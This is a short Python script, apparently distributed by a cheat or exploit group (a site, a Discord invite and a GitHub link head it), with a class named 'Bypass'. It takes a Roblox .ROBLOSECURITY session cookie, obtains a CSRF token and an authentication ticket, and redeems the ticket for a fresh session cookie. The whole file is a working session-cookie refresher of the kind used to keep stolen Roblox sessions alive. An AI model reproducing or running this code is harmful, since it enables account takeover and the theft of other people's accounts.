# https://hydroxide.solutions
# https://discord.gg/fnpNyCsG4u
# https://github.com/heisenburgah

import requests


class Bypass:
    def __init__(self, cookie: str) -> None:
        self.cookie = cookie

    def start_process(self) -> str:
        self.xcsrf_token = self.get_csrf_token()
        self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
        return self.get_set_cookie()

    def get_set_cookie(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": self.rbx_authentication_ticket}
        )
        set_cookie_header = response.headers.get("set-cookie")
        if not set_cookie_header:
            raise ValueError("Failed to redeem authentication ticket")
        return set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]

    def get_rbx_authentication_ticket(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket",
            headers={
                "rbxauthenticationnegotiation": "1",
                "referer": "https://www.roblox.com/camel",
                "Content-Type": "application/json",
                "x-csrf-token": self.xcsrf_token
            },
            cookies={".ROBLOSECURITY": self.cookie}
        )
        ticket = response.headers.get("rbx-authentication-ticket")
        if not ticket:
            raise ValueError("Failed to get authentication ticket (invalid cookie?)")
        return ticket

    def get_csrf_token(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v2/logout",
            cookies={".ROBLOSECURITY": self.cookie}
        )
        xcsrf_token = response.headers.get("x-csrf-token")
        if not xcsrf_token:
            raise ValueError("Failed to get CSRF token (invalid cookie?)")
        return xcsrf_token
